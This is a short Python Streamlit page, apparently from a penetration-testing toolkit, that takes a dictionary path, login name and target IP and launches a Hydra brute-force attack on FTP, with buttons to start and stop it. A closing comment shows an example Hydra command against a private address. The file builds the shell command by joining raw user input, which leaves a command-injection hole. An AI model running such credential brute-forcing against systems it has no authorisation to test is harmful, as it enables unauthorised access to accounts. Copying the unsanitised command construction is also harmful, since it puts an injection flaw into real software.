import streamlit as st
from ThreadManagement.ThreadManager import ThreadManager

attack = "Bruteforce FTP"
dictionary = ""
login = ""
threadManager = ThreadManager()
st.title(attack)

# check if attack is already in action
attackInAction = threadManager.check_running(attack=attack)
# if yes, allow attack to be stopped
if attackInAction == True:
    if st.button("Stop attack"):
        threadManager.stop_attack(attack=attack)

# if no, allow execution
dictionary = st.text_input(label="Dictionary")
login = st.text_input(label="Login as")
target = st.text_input(label="Target IP address")
if st.button("Start attack"):
    if dictionary == "" or login == "" or target == "":
        st.error(body="Every field must be filled")
    else:
        command = "hydra -l " + login + " -P " + dictionary + " " + target + " -t 4 -I -V ftp -f"
        threadManager.start_attack(attack=attack, command=command)

# hydra -l user1 -P /usr/share/sqlmap/txt/wordlist.txt 192.168.128.50 -t 4 -I -V ftp -f
